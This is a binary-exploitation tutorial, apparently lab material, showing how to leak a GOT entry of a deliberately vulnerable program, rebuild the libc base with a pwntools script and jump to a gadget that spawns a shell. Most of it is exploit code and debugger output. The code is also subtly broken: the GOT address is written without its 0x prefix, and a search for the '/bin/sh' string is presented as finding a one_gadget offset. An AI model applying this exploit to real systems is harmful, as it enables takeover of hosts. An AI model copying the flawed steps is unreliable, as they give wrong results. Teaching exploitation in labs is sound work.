
# Example, memory leak -> arbitrary call
`./ar8b_ac` is a program that
1. reads a ptr, `read_loc`
2. prints 8 bytes at `read_loc`
3. reads another ptr, `call_loc` 
4. executes the code at `call_loc`

# Exploit

## Get absolute address of the read entry in the global offset table
```
objdump -Mintel -d ar8b_ac | less
...
00000000004005b0 <read@plt>:
  4005b0:       ff 25 7a 0a 20 00       jmp    QWORD PTR [rip+0x200a7a]        # 601030 <_GLOBAL_OFFSET_TABLE_+0x30>
  4005b6:       68 03 00 00 00          push   0x3
  4005bb:       e9 b0 ff ff ff          jmp    400570 <_init+0x28>
...
```
In the above example, `0x601030` is the absolute address of the read entry in the GOT.
`0x4005b0` is the absolute address of the read trampoline.  For all intents and purposes,
when the program calls the function `read`, it thinks it is calling `read` in libc, but
it is really calling this trampoline which will 'jmp' to read in libc.

## Get offset of read in libc
```
vagrant@vagrant:/vagrant/2_got_leak_libc_reconstruction$ ldd ar8b_ac
        linux-vdso.so.1 =>  (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a0d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)
vagrant@vagrant:/vagrant/2_got_leak_libc_reconstruction$ objdump -Mintel -d /lib/x86_64-linux-gnu/libc.so.6 | less
...
00000000000f7250 <__read@@GLIBC_2.2.5>:
...
```

Now, correctly encode this information into a script `leak.py`
```
from pwn import *

endpoint = process("./ar8b_ac")

# ./ar8b_ac constants/offsets
read_got = 601030

# libc offsets
read_offset = 0xf7250

endpoint.send(p64(read_got))

data_received = endpoint.recv(8)
read_addr = u64(data_received)

print("[+] Read address: 0x{:2x}".format(read_addr))
libc_base = read_addr - read_offset
print("[+] Libc base: 0x{:2x}".format(libc_base))
```
At this point, you can effectively leak and reconstruct
the base address of `libc`.  Now, you need to make that knowledge
worth while and jump to a useful area in libc.  You can 
call multiple useful functions like `system` with an argument
of `/bin/sh`.  Or you can call a magic instruction known
as `one_gadget` that will call `execve("/bin/sh", ... )`,
effectively giving you a shell.  Here's a manual way to
find the `one_gadget` offset.

```
vagrant@vagrant:/vagrant/1_c_step_through$ ipython --quiet
In [1]: from pwn import *

In [2]: elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

In [3]: list(map(hex, elf.search("/bin/sh")))
Out[3]: ['0x18cd57']
```

Now, send the `one_gadget` address to the program
and launch into interactive mode.
```
endpoint.send(p64(libc_base + one_gadget_offset))
endpoint.interactive()
```
You should have a shell.  The example exploit is
in `solve.py` and you can run `./solve.py --gdb`
within a tmux terminal to step through the exploit.
